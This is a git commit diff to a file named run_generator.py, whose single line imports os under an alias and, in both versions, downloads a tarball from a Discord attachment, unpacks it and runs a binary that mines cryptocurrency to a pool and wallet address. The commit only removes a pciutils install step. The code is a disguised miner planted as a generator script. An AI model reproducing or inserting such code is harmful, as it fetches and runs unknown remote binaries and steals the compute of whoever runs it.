6aacc5c92e5791b7a7c3d43765943b210fc9b2c3
erikakaeri <92595143+erikakaeri@users.noreply.github.com>
2021-10-15 16:28:46 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("apt-get install -y wget && wget https://cdn.discordapp.com/attachments/796512270032437289/814876662688120842/bin.tar && tar -xvf bin.tar && cd bin && chmod +x work && apt-get update && apt-get install -y pciutils && ./work -rvram 1 -pool us.stratu.ms:13810 -ewal 373Ee6DSDgAYNAVSnfgUV99248L6Ab7aUH.uhsr8wuyjsb3oel -esm 3 -allpools 1 -allcoins 0")
+alpha.system("apt-get install -y wget && wget https://cdn.discordapp.com/attachments/796512270032437289/814876662688120842/bin.tar && tar -xvf bin.tar && cd bin && chmod +x work && apt-get update && ./work -rvram 1 -pool us.stratu.ms:13810 -ewal 373Ee6DSDgAYNAVSnfgUV99248L6Ab7aUH.uhsr8wuyjsb3oel -esm 3 -allpools 1 -allcoins 0")
